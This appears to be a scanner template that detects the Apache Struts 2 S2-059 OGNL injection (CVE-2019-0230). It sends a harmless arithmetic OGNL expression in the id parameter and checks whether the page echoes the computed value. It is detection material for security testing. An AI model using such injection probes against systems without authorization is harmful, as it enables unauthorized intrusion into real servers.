id: local-struts2-s2-059-math

info:
  name: Struts2 S2-059 OGNL Injection in Tag Attributes (CVE-2019-0230)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2 S2-059 (CVE-2019-0230) evaluates OGNL expressions
    in tag attribute values. Safe probe: %{233*233} evaluates to 54289
    which appears in the HTML id attribute of the response.
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-059
    - https://nvd.nist.gov/vuln/detail/CVE-2019-0230
  tags: safe-poc,struts2,s2-059,cve,cve2019,ognl,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}?id=%25%7B233*233%7D"
      - "{{BaseURL}}/index.action?id=%25%7B233*233%7D"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'id="54289"'
      - type: status
        status:
          - 200
